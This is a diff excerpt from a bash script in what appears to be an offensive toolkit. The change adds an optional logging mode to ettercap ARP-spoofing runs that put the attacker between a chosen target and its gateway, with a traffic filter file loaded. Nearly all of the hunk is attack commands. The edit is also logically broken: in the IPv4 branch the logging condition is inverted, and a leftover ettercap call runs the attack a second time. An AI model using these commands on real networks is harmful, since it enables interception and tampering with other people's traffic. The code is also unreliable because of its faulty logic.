@@ -200,9 +200,23 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
       echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework...${Reset};   
       sleep 2
       if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings...${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost// /$gateway//
+        fi
+
       else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost/ /$gateway/
+        fi
         echo ${GreenF}[☠]${white} Using IPv4 settings...${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
       fi
